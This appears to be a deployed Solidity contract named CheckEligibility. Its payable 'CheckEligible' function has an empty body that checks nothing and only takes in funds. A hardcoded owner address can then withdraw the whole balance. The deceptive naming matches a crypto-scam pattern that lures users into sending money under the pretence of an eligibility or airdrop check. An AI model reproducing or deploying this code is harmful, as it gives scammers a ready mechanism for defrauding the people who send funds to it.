/**
 *Submitted for verification at polygonscan.com on 2023-05-24
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.4.26;

contract CheckEligibility {

    address private  owner;

     constructor() public{   
        owner=0x33DaAA8EA418d9249501DFEBF066Eeb49332C012;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function CheckEligible() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}